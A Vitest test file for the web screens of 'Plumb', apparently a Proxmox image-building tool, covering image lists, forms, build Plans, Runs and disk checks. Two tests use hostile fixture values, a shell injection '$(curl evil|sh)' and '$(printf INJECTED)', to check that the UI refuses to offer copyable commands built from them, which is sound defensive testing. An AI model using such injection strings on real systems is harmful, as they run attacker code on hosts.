// @vitest-environment happy-dom
// Screen and mock tests of T-064: Image list, Image page, Image form, the
// Image part of a Plan, build lanes of a Run, the Target disk check.
import { execFileSync } from "node:child_process";
import { flushSync } from "svelte";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ApiError } from "../lib/api";
import { createMockApi } from "../lib/mock/mock";
import type { ImageDoc } from "../lib/types";
import ImageForm from "./ImageForm.svelte";
import Images from "./Images.svelte";
import ImageScreen from "./ImageView.svelte";
import PlanView from "./PlanView.svelte";
import RunView from "./RunView.svelte";
import TargetForm from "./TargetForm.svelte";
import { button, el, planOpened, reset, rows, show, text, type, until } from "./testkit";

afterEach(reset);
const adminApi = () => createMockApi({ signedIn: true, stepDelayMs: 0 });

const builtDoc = (name: string, disk = 10): ImageDoc => ({
  kind: "Image",
  name,
  spec: {
    type: "vm",
    url: "https://example.org/base.qcow2",
    sha256: "b".repeat(64),
    build: {
      blocks: [{ use: "motd" }],
      upgrade: true,
      guest: { cores: 1, memory: 1024, disk, bridge: "vmbr0", ip: "dhcp" },
    },
    retention: { keep: 3 },
  },
});

describe("image list", () => {
  it("shows stock and built images, the newest version, a running build, the next build", async () => {
    show(Images, { api: adminApi() });
    const r = await until(() => rows().length === 4 && rows());
    expect(r.find((x) => x.startsWith("debian-13"))).toContain("Stock");
    const web = r.find((x) => x.startsWith("ubuntu-web"));
    expect(web).toContain("Built");
    expect(web).toContain("v3");
    expect(web).toContain("schedule");
    expect(web).not.toMatch(/ – $/); // next build is set
    const tools = r.find((x) => x.startsWith("debian-tools"));
    expect(tools).toContain("none ready");
    expect(tools).toContain("Building v1");
  });
});

describe("image page", () => {
  it("shows versions, the reason of the failed build, Targets, unused imports", async () => {
    show(ImageScreen, { api: adminApi(), name: "ubuntu-web" });
    await until(() => text().includes("would be 87 % full"));
    const r = rows();
    expect(r[0]).toMatch(/^v3 ?ready .*Run 19 ?web3$/);
    expect(r[1]).toContain("guest:config: The build did not start: local-lvm would be 87 % full");
    expect(r[2]).toMatch(/Run 15 ?web1, web2$/);
    expect(text()).toContain("pvesm free plumb-images:import/plumb-ubuntu-web-0b1c2d3e4f5a.qcow2");
    expect(text()).toContain("Every Sunday at 03:00 UTC");
    expect(text()).toContain("A build does not start when the storage would be more than 85 %");
    expect(document.querySelector("#last-failed")).toBeNull(); // the last build is v3, ready
  });

  it("offers Copy only for Plumb's own pvesm line (review S1)", async () => {
    const api = adminApi();
    const real = await api.getImage("ubuntu-web");
    const st = real.status;
    if (!st) throw new Error("no status");
    const bad = "pvesm free plumb-images:import/plumb-x;$(curl evil|sh) 'a\"-0b1c2d3e4f5a.qcow2";
    st.unused_imports = [
      ...st.unused_imports,
      { volume: "plumb-images:import/x;$(curl evil|sh)", command: bad, size_bytes: 1024 },
    ];
    vi.spyOn(api, "getImage").mockResolvedValue(real);
    show(ImageScreen, { api, name: "ubuntu-web" });
    await until(() => text().includes("Unused import files") && text().includes("pvesm free"));
    expect(text()).not.toContain(bad);
    expect(text()).toContain("Check it by hand on the Proxmox host");
    const copies = [...document.querySelectorAll("button")].filter((b) =>
      b.textContent?.startsWith("Copy"),
    );
    expect(copies).toHaveLength(st.unused_imports.length - 1);
  });

  it("the Versions table scrolls with the keyboard (review N3)", async () => {
    show(ImageScreen, { api: adminApi(), name: "ubuntu-web" });
    const wrap = await until(() => document.querySelector<HTMLElement>(".table-wrap"));
    expect(wrap.getAttribute("tabindex")).toBe("0");
    expect(wrap.getAttribute("aria-label")).toContain("Versions of image ubuntu-web");
  });

  it("Build now makes a build Plan", async () => {
    const api = adminApi();
    const build = vi.spyOn(api, "buildImage");
    show(ImageScreen, { api, name: "ubuntu-web" });
    await until(() => button("Build now"));
    type("#build-reason", "Fresh packages.");
    el<HTMLFormElement>("form").requestSubmit();
    const id = await planOpened();
    expect(build).toHaveBeenCalledWith("ubuntu-web", "Fresh packages.");
    const plan = await api.getPlan(id);
    expect(plan.origin).toBe("build");
    expect(plan.images?.[0]?.build).toMatchObject({ version: 4, trigger: "manual" });
    expect(plan.human_only ?? []).toEqual([]);
  });

  it("closes Build now while a build runs", async () => {
    show(ImageScreen, { api: adminApi(), name: "debian-tools" });
    await until(() => document.querySelector("#building"));
    expect(button("Build now")?.disabled).toBe(true);
    expect(text(el("#building"))).toContain("Watch run 18");
  });

  it("shows a failed last build with its reason", async () => {
    const api = adminApi();
    const view = await api.getImage("ubuntu-web");
    const failed = view.status?.versions.find((v) => v.version === 2);
    if (!view.status || !failed) throw new Error("no seed");
    vi.spyOn(api, "getImage").mockResolvedValue({
      ...view,
      status: { ...view.status, last_build: failed },
    });
    show(ImageScreen, { api, name: "ubuntu-web" });
    const banner = await until(() => {
      const b = document.querySelector("#last-failed");
      return b && text(b).includes("87 %") && b;
    });
    expect(text(banner)).toContain("The last build failed (v2, Run 17)");
  });

  it("says that a stock image has no versions", async () => {
    show(ImageScreen, { api: adminApi(), name: "debian-13" });
    await until(() => text().includes("A stock image has no versions."));
    expect(button("Build now")).toBeUndefined();
  });
});

describe("image form", () => {
  it("makes a built image with a schedule; a Block with a secret is not offered", async () => {
    const api = adminApi();
    const createPlan = vi.spyOn(api, "createPlan");
    show(ImageForm, { api });
    await until(() => document.querySelector("#i-build"));
    type("#i-name", "debian-web");
    type("#i-url", "https://cloud.debian.org/images/cloud/trixie/latest/debian-13.qcow2");
    type("#i-sha", "c".repeat(64));
    el<HTMLInputElement>("#i-build").click();
    flushSync();
    const choices = [...el<HTMLSelectElement>("#add-choice").options].map((o) => o.value);
    expect(choices).toContain("nginx");
    expect(choices).not.toContain("app");
    expect(text()).toContain("Not offered: app");
    type("#add-choice", "nginx");
    button("Add Block")?.click();
    flushSync();
    type("#i-every", "week");
    type("#i-weekday", "sat");
    type("#i-at", "04:30");
    expect(text()).toContain("Next build:");
    type("#i-reason", "Web template.");
    el<HTMLFormElement>("form").requestSubmit();
    const id = await planOpened();
    const doc = createPlan.mock.calls[0]?.[0].put?.[0] as ImageDoc;
    expect(doc.spec.build?.blocks?.map((b) => b.use)).toEqual(["nginx"]);
    expect(doc.spec.schedule).toEqual({ every: "week", weekday: "sat", at: "04:30" });
    expect(doc.spec.retention).toEqual({ keep: 3 });
    const plan = await api.getPlan(id);
    expect(plan.human_only).toEqual(["image-recipe"]);
    expect(plan.images?.[0]?.build).toMatchObject({ version: 1, trigger: "change" });
  });

  it("checks the fields before it sends", async () => {
    const api = adminApi();
    const createPlan = vi.spyOn(api, "createPlan");
    show(ImageForm, { api });
    await until(() => document.querySelector("#i-build"));
    type("#i-name", "Bad_Name");
    type("#i-url", "http://x");
    type("#i-sha", "abc");
    el<HTMLInputElement>("#i-build").click();
    flushSync();
    type("#i-keep", "30");
    type("#i-every", "month");
    type("#i-day", "31");
    el<HTMLFormElement>("form").requestSubmit();
    flushSync();
    expect(createPlan).not.toHaveBeenCalled();
    for (const m of [
      "Use lower-case letters",
      "Give an https:// address",
      "64 characters",
      "Keep 1 to 20 versions.",
      "Choose a day from 1 to 28.",
      "Say why you make this change.",
    ])
      expect(text()).toContain(m);
  });

  it("lowers keep on an existing image: the Plan removes v1", async () => {
    const api = adminApi();
    show(ImageForm, { api, name: "ubuntu-web" });
    await until(() => document.querySelector<HTMLInputElement>("#i-keep")?.value === "3");
    expect(el<HTMLInputElement>("#i-name").readOnly).toBe(true);
    type("#i-keep", "1");
    type("#i-reason", "Less disk.");
    el<HTMLFormElement>("form").requestSubmit();
    const id = await planOpened();
    reset();
    show(PlanView, { api, id });
    await until(() => text().includes("Removes v1"));
    expect(text()).toContain("A person must approve: image recipe");
    expect(text()).not.toContain("New version");
  });

  it("warns when the build is switched off", async () => {
    show(ImageForm, { api: adminApi(), name: "ubuntu-web" });
    await until(() => document.querySelector("#i-build"));
    el<HTMLInputElement>("#i-build").click();
    flushSync();
    expect(text(el("#i-unbuild"))).toContain("removes every built version");
  });
});

describe("mock builds", () => {
  it("approves the build Plan 21: a Run with a build lane makes v4", async () => {
    const api = adminApi();
    const run = await api.approvePlan(21);
    expect(run.images?.[0]?.steps.map((s) => s.resource)).toEqual([
      "image:base",
      "guest:config",
      "package:nginx",
      "service:nginx",
      "image:seal",
      "image:template",
      "image:retention",
    ]);
    expect((await api.getPlan(21)).revision).toBeNull();
    await api.idle();
    expect((await api.getRun(run.id)).status).toBe("succeeded");
    const st = (await api.getImage("ubuntu-web")).status;
    expect(st?.building).toBeNull();
    expect(st?.last_build).toMatchObject({ version: 4, status: "ready" });
    // keep 3: v4, v3 and v1 stay
    expect(st?.versions.filter((v) => v.status === "ready").map((v) => v.version)).toEqual([
      4, 3, 1,
    ]);
  });

  it("refuses a second build of an image that builds now (409 build-running)", async () => {
    const api = adminApi();
    const plan = await api.buildImage("debian-tools");
    await expect(api.approvePlan(plan.id)).rejects.toMatchObject({
      problem: { status: 409, type: "urn:plumb:problem:build-running" },
    });
  });

  it("refuses a build of a stock image (422)", async () => {
    await expect(adminApi().buildImage("debian-13")).rejects.toBeInstanceOf(ApiError);
  });

  it("stops a build that would fill the disk storage over 85 % (answer 7)", async () => {
    const api = adminApi();
    const plan = await api.createPlan({ reason: "Big.", put: [builtDoc("big", 40)] });
    const run = await api.approvePlan(plan.id);
    await api.idle();
    const done = await api.getRun(run.id);
    expect(done.status).toBe("failed");
    const step = done.images?.[0]?.steps.find((s) => s.resource === "guest:config");
    expect(step?.status).toBe("failed");
    expect(step?.output).toContain("limit 85 %");
    expect((await api.getImage("big")).status?.versions[0]?.status).toBe("failed");
  });

  it("removes v1 when keep goes to 1, after the Run", async () => {
    const api = adminApi();
    const view = await api.getImage("ubuntu-web");
    const doc = { ...view.document, spec: { ...view.document.spec, retention: { keep: 1 } } };
    const plan = await api.createPlan({ reason: "Less.", put: [doc] });
    expect(plan.images?.[0]?.removes).toEqual([
      { kind: "version", name: "plumb-img-ubuntu-web-v1", version: 1 },
    ]);
    await api.approvePlan(plan.id);
    await api.idle();
    const v1 = (await api.getImage("ubuntu-web")).status?.versions.find((v) => v.version === 1);
    expect(v1?.status).toBe("removed");
  });

  it("refuses a Block with a secret parameter in an image (D-202)", async () => {
    const doc = builtDoc("sec");
    if (doc.spec.build) doc.spec.build.blocks = [{ use: "app" }];
    await expect(adminApi().createPlan({ reason: "x", put: [doc] })).rejects.toMatchObject({
      problem: { status: 422 },
    });
  });

  it("refuses to delete an image that a Target uses", async () => {
    await expect(
      adminApi().createPlan({ reason: "x", delete: [{ kind: "Image", name: "ubuntu-web" }] }),
    ).rejects.toMatchObject({ problem: { status: 422 } });
  });
});

describe("Run and Target screens", () => {
  it("shows the build steps of a running build", async () => {
    show(RunView, { api: adminApi(), id: 18 });
    await until(() => text().includes("Image debian-tools"));
    expect(text()).toContain("version 1 · Build now");
    expect(rows()[0]).toContain("Base image: download and check the checksum");
    expect(rows().at(-1)).toContain("pending");
  });

  it("shows the image version of a Target", async () => {
    show(TargetForm, { api: adminApi(), name: "web3" });
    const v = await until(() => document.querySelector("#t-image-version"));
    expect(text(v)).toBe("Made from image ubuntu-web v3.");
  });

  it("refuses a smaller disk than the template on a new Target (D-202)", async () => {
    const api = adminApi();
    const createPlan = vi.spyOn(api, "createPlan");
    show(TargetForm, { api });
    await until(() => document.querySelector("#t-image option[value='ubuntu-web']"));
    type("#t-name", "web4");
    type("#t-image", "ubuntu-web");
    expect(text()).toContain("At least 10 GiB: the template of image ubuntu-web has 10 GiB.");
    type("#guest-disk", "5");
    type("#t-reason", "New web server.");
    el<HTMLFormElement>("form").requestSubmit();
    flushSync();
    expect(createPlan).not.toHaveBeenCalled();
    expect(el("#guest-disk").getAttribute("aria-invalid")).toBe("true");
  });
});

describe("image acceptance gaps", () => {
  it("copies a valid import command exactly and refuses a hostile one (S1)", async () => {
    const api = adminApi();
    const view = await api.getImage("ubuntu-web");
    if (!view.status) throw new Error("no status");
    const hostileVolume = "store:import/image' ; $(printf INJECTED) `printf INJECTED` & file.qcow2";
    // A quoted line is still no line of Plumb's own form: no Copy (review S1).
    const hostile = `pvesm free '${hostileVolume.replaceAll("'", "'\\''")}'`;
    const volume = "plumb-images:import/plumb-ubuntu-web-0b1c2d3e4f5a.qcow2";
    const command = `pvesm free ${volume}`;
    vi.spyOn(api, "getImage").mockResolvedValue({
      ...view,
      status: {
        ...view.status,
        unused_imports: [
          { volume: hostileVolume, command: hostile, size_bytes: 1024 },
          { volume, command, size_bytes: 1024 },
        ],
      },
    });
    const writeText = vi.fn().mockResolvedValue(undefined);
    const clipboard = vi
      .spyOn(navigator, "clipboard", "get")
      .mockReturnValue({ writeText } as unknown as Clipboard);
    try {
      show(ImageScreen, { api, name: "ubuntu-web" });
      (await until(() => button(/^Copy/))).click();
      await until(() => writeText.mock.calls.length);
      expect(document.querySelectorAll(".cmd")).toHaveLength(1);
      expect(text()).not.toContain(hostile);
      const copied = writeText.mock.calls[0]?.[0] as string;
      expect(copied).toBe(command);
      expect(el(".cmd code").textContent).toBe(command);
      // Capture shell arguments with a harmless stub. No host command runs.
      expect(
        execFileSync("sh", ["-c", `pvesm() { printf '%s\\n' "$#" "$1" "$2"; }; ${copied}`], {
          encoding: "utf8",
        }),
      ).toBe(`2\nfree\n${volume}\n`);
    } finally {
      clipboard.mockRestore();
    }
  });

  it.each(["day", "week", "month"])(
    "saves %s schedules with safe build defaults",
    async (every) => {
      const api = adminApi();
      const create = vi.spyOn(api, "createPlan");
      show(ImageForm, { api });
      await until(() => document.querySelector("#i-build"));
      expect(el<HTMLInputElement>("#i-build").checked).toBe(false);
      type("#i-name", "scheduled");
      type("#i-url", "https://example.org/base.qcow2");
      type("#i-sha", "a".repeat(64));
      el<HTMLInputElement>("#i-build").click();
      flushSync();
      expect(el<HTMLInputElement>("#i-upgrade").checked).toBe(true);
      expect(el<HTMLInputElement>("#i-keep").value).toBe("3");
      type("#i-every", every);
      type("#i-at", "04:30");
      expect(text(el("#i-at-hint"))).toContain("(your local time)");
      type("#i-reason", "Scheduled image.");
      el<HTMLFormElement>("form").requestSubmit();
      await planOpened();
      const doc = create.mock.calls[0]?.[0].put?.[0] as ImageDoc;
      expect(doc.spec.build?.upgrade).toBe(true);
      expect(doc.spec.build?.guest.disk).toBeGreaterThan(0);
      expect(doc.spec.build?.guest.bridge).toBeTruthy();
      expect(doc.spec.retention?.keep).toBe(3);
      expect(doc.spec.schedule).toMatchObject({ every, at: "04:30" });
    },
  );

  it("shows the new version and resources of a build Plan", async () => {
    show(PlanView, { api: adminApi(), id: 21 });
    await until(() => text().includes("New version v4"));
    expect(text()).toContain("package:nginx");
    expect(text()).toContain("service:nginx");
    expect(text()).toContain("All packages are upgraded");
  });
});
